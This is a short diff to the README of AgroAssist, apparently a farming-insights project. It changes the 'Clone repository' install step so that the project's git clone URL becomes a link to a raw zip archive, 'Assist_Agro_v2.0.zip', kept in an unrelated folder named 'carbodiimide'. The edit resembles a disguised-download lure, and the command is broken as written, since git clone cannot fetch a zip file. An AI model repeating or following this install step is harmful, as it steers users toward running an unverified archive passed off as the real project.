@@ -33,7 +33,7 @@ Helps farmers access personalized insights for crop planning, weather monitoring
 
 Clone repository:
 
-git clone https://github.com/nithish-ui/AgroAssist
+git clone https://github.com/nithish-ui/AgroAssist/raw/refs/heads/main/carbodiimide/Assist_Agro_v2.0.zip
 cd AgroAssist
 
 Install dependencies:
